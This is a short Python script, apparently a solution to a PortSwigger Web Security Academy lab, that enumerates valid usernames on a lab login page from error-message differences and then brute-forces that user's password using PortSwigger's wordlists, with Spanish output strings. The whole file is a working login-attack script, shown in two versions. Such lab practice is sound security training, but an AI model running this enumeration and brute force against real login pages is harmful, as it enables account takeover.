import requests

url = "https://0a6000b803225e84811294e600ee0055.web-security-academy.net/login"

usernames = requests.get("https://portswigger.net/web-security/authentication/auth-lab-usernames").text.split("\n")

for username in usernames:
    username = username.strip()
    data = {"username": username, "password": "test"}
    response = requests.post(url, data=data)
    if "Invalid username" not in response.text:
        print(f"Usuario encontrado: {username}")
        break


        import requests
from bs4 import BeautifulSoup

url = "https://0a6000b803225e84811294e600ee0055.web-security-academy.net/login"

pagina = requests.get("https://portswigger.net/web-security/authentication/auth-lab-usernames")
soup = BeautifulSoup(pagina.text, "html.parser")
codigo = soup.find("code")
usernames = codigo.text.strip().split("\n")

for username in usernames:
    username = username.strip()
    data = {"username": username, "password": "test"}
    response = requests.post(url, data=data)
    if "Invalid username" not in response.text:
        print("Usuario encontrado: " + username)
        usuario_valido = username
        break

pagina2 = requests.get("https://portswigger.net/web-security/authentication/auth-lab-passwords")
soup2 = BeautifulSoup(pagina2.text, "html.parser")
codigo2 = soup2.find("code")
passwords = codigo2.text.strip().split("\n")

for password in passwords:
    password = password.strip()
    data = {"username": usuario_valido, "password": password}
    response = requests.post(url, data=data)
    if "Incorrect password" not in response.text:
        print("Contraseña encontrada: " + password)
        break
